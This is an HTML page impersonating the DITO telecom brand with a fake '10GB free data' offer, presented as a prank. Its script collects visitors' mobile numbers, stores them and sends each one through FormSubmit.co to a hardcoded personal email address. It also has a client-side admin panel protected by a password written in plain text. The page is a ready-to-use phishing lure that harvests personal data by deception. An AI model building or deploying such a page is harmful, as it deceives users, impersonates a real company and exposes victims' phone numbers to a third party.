<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DITO SIM - Exclusive Free Data Offer</title>
    <style>
        /* Main Styles */
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
        }
        
        /* Prank Page Styles */
        .prank-page {
            background-color: #e60012;
            color: white;
            text-align: center;
            display: block;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .logo {
            width: 150px;
            margin-bottom: 20px;
        }
        
        .offer-card {
            background-color: white;
            color: #333;
            border-radius: 15px;
            padding: 30px;
            margin: 30px 0;
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }
        
        h1 {
            color: #ffcc00;
            font-size: 2.5em;
        }
        
        .highlight {
            font-size: 1.5em;
            font-weight: bold;
            color: #e60012;
            margin: 20px 0;
        }
        
        .form-group {
            margin: 25px 0;
        }
        
        input[type="tel"], input[type="password"], input[type="email"] {
            padding: 15px;
            width: 80%;
            max-width: 400px;
            border: 2px solid #e60012;
            border-radius: 8px;
            font-size: 1.2em;
        }
        
        button {
            background-color: #e60012;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 1.2em;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        
        button:hover {
            background-color: #c5000f;
        }
        
        .disclaimer {
            font-size: 0.8em;
            margin-top: 30px;
            color: rgba(255,255,255,0.7);
        }
        
        #notification {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: white;
            color: #333;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            z-index: 100;
            max-width: 80%;
        }
        
        .close-btn {
            margin-top: 20px;
            background-color: #e60012;
        }
        
        .admin-link {
            position: fixed;
            bottom: 10px;
            right: 10px;
            color: white;
            text-decoration: none;
            font-size: 0.8em;
        }
        
        /* Admin Panel Styles */
        .admin-page {
            display: none;
            background-color: #f5f5f5;
            min-height: 100vh;
        }
        
        .admin-container {
            max-width: 1000px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        
        .admin-page h1 {
            color: #e60012;
            text-align: center;
        }
        
        .login-form {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        
        th {
            background-color: #e60012;
            color: white;
        }
        
        tr:hover {
            background-color: #f5f5f5;
        }
        
        .stats {
            background: #f0f0f0;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        
        .back-btn {
            display: inline-block;
            margin-top: 20px;
            padding: 10px 15px;
            background: #e60012;
            color: white;
            text-decoration: none;
            border-radius: 4px;
        }
        
        #loginError {
            color: red;
            margin-top: 10px;
        }
        
        .loading {
            display: none;
            margin-top: 20px;
            text-align: center;
        }
    </style>
</head>
<body>
    <!-- Main Prank Page -->
    <div class="prank-page" id="prankPage">
        <div class="container">
            <img src="https://www.dito.ph/wp-content/uploads/2020/12/dito-logo.png" alt="DITO Logo" class="logo" onerror="this.src='https://via.placeholder.com/150x50?text=DITO+LOGO'">
            <h1>EXCLUSIVE FREE DATA OFFER!</h1>
            <p>Limited time only for DITO subscribers</p>
            
            <div class="offer-card">
                <h2>ðŸŽ‰ 10GB FREE DATA FOR 30 DAYS ðŸŽ‰</h2>
                <p>As part of our anniversary celebration, we're giving away free data to selected users!</p>
                
                <div class="highlight">
                    CLAIM YOUR 10GB NOW!
                </div>
                
                <div class="form-group">
                    <p>Enter your DITO mobile number below:</p>
                    <input type="tel" id="phoneNumber" placeholder="09XXXXXXXXX" pattern="[0-9]{9}" required>
                </div>
                
                <button id="submitBtn">CLAIM FREE DATA</button>
                <div class="loading" id="loading">Sending notification...</div>
                
                <p><small>Offer valid until supplies last. DITO subscribers only.</small></p>
            </div>
            
            <div class="disclaimer">
                This website not affiliated with DITO. 
            </div>
        </div>
        
        <div id="notification">
            <h2>GOTCHA! ðŸ¤£</h2>
            <p>Your number <span id="displayNumber"></span> has been noted!</p>
            <p>This was just a prank - no free data will be given.</p>
            <p>Thanks for playing along!</p>
            <button class="close-btn" id="closeBtn">Close</button>
        </div>
        
        <a href="#ditoph-admin" class="admin-link" id="adminLink">Admin Login</a>
    </div>

    <!-- Admin Panel -->
    <div class="admin-page" id="adminPage">
        <div class="admin-container">
            <div id="loginForm">
                <h1>Admin Login</h1>
                <div class="login-form">
                    <input type="password" id="adminPassword" placeholder="Enter admin password">
                    <button id="loginBtn">Login</button>
                    <p id="loginError"></p>
                </div>
            </div>
            
            <div id="adminPanel" style="display:none;">
                <h1>DITO Prank Admin Panel</h1>
                
                <div class="stats">
                    <h2>Statistics</h2>
                    <p>Total Pranked Numbers: <span id="totalPranked">0</span></p>
                    <p>First Prank: <span id="firstPrank">None</span></p>
                    <p>Last Prank: <span id="lastPrank">None</span></p>
                </div>
                
                <h2>Pranked Numbers</h2>
                <div style="max-height: 500px; overflow-y: auto;">
                    <table id="numbersTable">
                        <thead>
                            <tr>
                                <th>Number</th>
                                <th>Date</th>
                            </tr>
                        </thead>
                        <tbody id="numbersList"></tbody>
                    </table>
                </div>
                
                <button class="back-btn" id="backBtn">Back to Main Page</button>
            </div>
        </div>
    </div>

    <script>
        // Configuration - CHANGE THESE VALUES!
        const ADMIN_PASSWORD = "DitoPrank2023"; // Change this!
        const STORAGE_KEY = "dito_prank_numbers";
        const YOUR_EMAIL = "srivigneshsiddula1@gmail.com"; // Your email to receive notifications
        
        // FormSubmit.co endpoint - This will send emails to your address
        const FORM_SUBMIT_URL = "https://formsubmit.co/ajax/" + encodeURIComponent(YOUR_EMAIL);
        
        // DOM Elements
        const elements = {
            prankPage: document.getElementById('prankPage'),
            adminPage: document.getElementById('adminPage'),
            adminLink: document.getElementById('adminLink'),
            backBtn: document.getElementById('backBtn'),
            phoneNumber: document.getElementById('phoneNumber'),
            submitBtn: document.getElementById('submitBtn'),
            loading: document.getElementById('loading'),
            notification: document.getElementById('notification'),
            displayNumber: document.getElementById('displayNumber'),
            closeBtn: document.getElementById('closeBtn'),
            loginForm: document.getElementById('loginForm'),
            adminPanel: document.getElementById('adminPanel'),
            adminPassword: document.getElementById('adminPassword'),
            loginBtn: document.getElementById('loginBtn'),
            loginError: document.getElementById('loginError'),
            totalPranked: document.getElementById('totalPranked'),
            firstPrank: document.getElementById('firstPrank'),
            lastPrank: document.getElementById('lastPrank'),
            numbersList: document.getElementById('numbersList')
        };
        
        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            // Check URL for admin page
            if (window.location.hash === '#ditoph-admin') {
                showAdminPage();
            }
            
            // Set up event listeners
            setupEventListeners();
        });
        
        function setupEventListeners() {
            // Main prank functionality
            elements.submitBtn.addEventListener('click', handleNumberSubmission);
            elements.closeBtn.addEventListener('click', closeNotification);
            elements.adminLink.addEventListener('click', handleAdminLinkClick);
            elements.backBtn.addEventListener('click', showPrankPage);
            elements.loginBtn.addEventListener('click', checkPassword);
            elements.adminPassword.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') checkPassword();
            });
        }
        
        async function handleNumberSubmission() {
            const phoneNumber = elements.phoneNumber.value.trim();
            
            if (/^09\d{9}$/.test(phoneNumber)) {
                elements.submitBtn.disabled = true;
                elements.loading.style.display = 'block';
                
                try {
                    // Save locally
                    savePrankedNumber(phoneNumber);
                    
                    // Send email notification
                    await sendEmailNotification(phoneNumber);
                    
                    // Show success notification
                    showNotification(phoneNumber);
                } catch (error) {
                    console.error("Error:", error);
                    alert("Something went wrong. The prank still worked, but the notification may not have been sent.");
                    showNotification(phoneNumber);
                } finally {
                    elements.submitBtn.disabled = false;
                    elements.loading.style.display = 'none';
                }
            } else {
                alert('Please enter a valid 11-digit DITO number starting with 09');
            }
        }
        
        function savePrankedNumber(phoneNumber) {
            const prankEntry = {
                number: phoneNumber,
                timestamp: new Date().toISOString()
            };
            
            // Get existing data or initialize empty array
            const existingData = JSON.parse(localStorage.getItem(STORAGE_KEY)) || [];
            
            // Add new entry
            const updatedData = [...existingData, prankEntry];
            
            // Save back to localStorage
            localStorage.setItem(STORAGE_KEY, JSON.stringify(updatedData));
        }
        
        async function sendEmailNotification(phoneNumber) {
            const timestamp = new Date().toLocaleString();
            const subject = `New Pranked Number: ${phoneNumber}`;
            const message = `
                <h2>Someone fell for your DITO prank! ðŸ¤£</h2>
                <p><strong>Phone Number:</strong> ${phoneNumber}</p>
                <p><strong>Time:</strong> ${timestamp}</p>
                <p><strong>Total pranked so far:</strong> ${getTotalPrankedCount() + 1}</p>
            `;
            
            const formData = new FormData();
            formData.append('_subject', subject);
            formData.append('message', message);
            formData.append('_template', 'table');
            formData.append('_captcha', 'false');
            
            const response = await fetch(FORM_SUBMIT_URL, {
                method: "POST",
                body: formData
            });
            
            if (!response.ok) {
                throw new Error("Email sending failed");
            }
        }
        
        function getTotalPrankedCount() {
            const prankData = JSON.parse(localStorage.getItem(STORAGE_KEY)) || [];
            return prankData.length;
        }
        
        function showNotification(phoneNumber) {
            elements.displayNumber.textContent = phoneNumber;
            elements.notification.style.display = 'block';
        }
        
        function closeNotification() {
            elements.notification.style.display = 'none';
            elements.phoneNumber.value = '';
        }
        
        function handleAdminLinkClick(e) {
            e.preventDefault();
            showAdminPage();
        }
        
        function checkPassword() {
            const enteredPassword = elements.adminPassword.value;
            
            if (enteredPassword === ADMIN_PASSWORD) {
                elements.loginForm.style.display = 'none';
                elements.adminPanel.style.display = 'block';
                loadPrankedNumbers();
            } else {
                elements.loginError.textContent = "Incorrect password!";
            }
        }
        
        function loadPrankedNumbers() {
            const prankData = JSON.parse(localStorage.getItem(STORAGE_KEY)) || [];
            const sortedData = [...prankData].reverse(); // Newest first
            
            // Update stats
            elements.totalPranked.textContent = prankData.length;
            elements.firstPrank.textContent = prankData.length > 0 ? formatDate(prankData[0].timestamp) : 'None';
            elements.lastPrank.textContent = prankData.length > 0 ? formatDate(prankData[prankData.length-1].timestamp) : 'None';
            
            // Populate table
            elements.numbersList.innerHTML = '';
            sortedData.forEach(entry => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${entry.number}</td>
                    <td>${formatDate(entry.timestamp)}</td>
                `;
                elements.numbersList.appendChild(row);
            });
        }
        
        function formatDate(isoString) {
            const date = new Date(isoString);
            return date.toLocaleString();
        }
        
        function showAdminPage() {
            elements.prankPage.style.display = 'none';
            elements.adminPage.style.display = 'block';
            window.location.hash = 'ditoph-admin';
            elements.adminPassword.value = '';
            elements.loginError.textContent = '';
            elements.loginForm.style.display = 'block';
            elements.adminPanel.style.display = 'none';
        }
        
        function showPrankPage() {
            elements.prankPage.style.display = 'block';
            elements.adminPage.style.display = 'none';
            window.location.hash = '';
        }
    </script>
</body>
</html>
